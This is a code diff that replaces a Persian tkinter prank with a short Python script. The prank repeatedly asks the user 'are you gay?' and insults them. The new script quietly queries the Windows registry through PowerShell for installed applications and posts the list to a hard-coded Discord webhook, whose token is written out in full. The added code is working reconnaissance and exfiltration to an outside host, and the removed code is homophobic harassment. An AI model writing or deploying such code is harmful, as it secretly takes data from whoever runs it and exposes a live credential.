@@ -1,23 +1,28 @@
-from tkinter import *
-from tkinter import messagebox
+import subprocess
+import requests
 
-class TestShakhsiat:
-    def __init__(self):
-        self.root = Tk()
-        self.root.geometry("0x0")
-        self.ask()
-        self.root.mainloop()
+def get_installed_apps():
+    # PowerShell'i UTF-8 çıkışla çalıştır
+    ps_command = 'Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName | ForEach-Object { $_.DisplayName }'
+    result = subprocess.run(
+        ["powershell", "-Command", ps_command],
+        capture_output=True,
+        text=True,
+        encoding="utf-8",  # UTF-8 ile decode et
+        errors="ignore"    # decode edilemeyen karakterleri görmezden gel
+    )
+    apps = [line.strip() for line in result.stdout.splitlines() if line.strip()]
+    return apps
 
+WEBHOOK_URL = "https://discord.com/api/webhooks/1413672896261521510/9pX3ChqGVjmUcubiA9mTTmZw4SKarJRgHd7qTf9mzBFo8rXVdKcLIGKPhgWuqgPV1uIV"
 
-    def ask(self):
-       while True:
-        self.answer =  messagebox.askyesno(title="تست گرایش", message="آیا تو گی هستی؟")
-        if self.answer == True:
-           messagebox.showinfo(message="=) میدونستم گی ای")
-           break
+def send_to_discord(app_list):
+    data = {"content": "Yüklü uygulamalar:\n" + "\n".join(app_list[:50])}
+    response = requests.post(WEBHOOK_URL, json=data)
+    if response.status_code == 204:
+        print("Gönderildi!")
+    else:
+        print("Hata:", response.status_code, response.text)
 
-        else:
-           messagebox.showerror(message="نه تو گی ای حتمی")
-            
-
-TestShakhsiat()
+apps = get_installed_apps()
+send_to_discord(apps)
